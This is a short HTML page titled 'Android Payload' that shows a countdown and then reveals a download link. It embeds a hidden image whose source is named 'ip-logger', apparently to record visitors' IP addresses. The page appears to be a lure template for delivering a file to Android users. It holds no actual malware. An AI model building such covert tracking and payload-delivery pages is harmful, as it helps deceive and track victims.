<html lang="en">
<head>
<title> Android Payload </title>
</head>
<body>
<img src="ip-logger" id="logger">
<div id="counter-text">Loading...    Please Wait For <span id="counter">  </span> Seconds. 
</div>
<a href="javascript:download('download.txt')" style="display:none" id="link"> 
Click To Download </a>
<script>
time = 5;
document.getElementById("counter").innerHTML = time;
timer = setInterval("count()",1000);

function count()
{
 if(time == 1)
 {
  //Cleare Timer and remove counter from page
  clearInterval(timer);
  document.getElementById("counter-text").style.display="none";
  //If you want to display link
  document.getElementById("link").style.display="block";
  //Or directly start download
  //download('file.ext');
 }
 else
 {
  time--;
  document.getElementById("counter").innerHTML = time;
 }
}
function download(file)
{
 window.location=file;
}
</script>
</body>
</html>
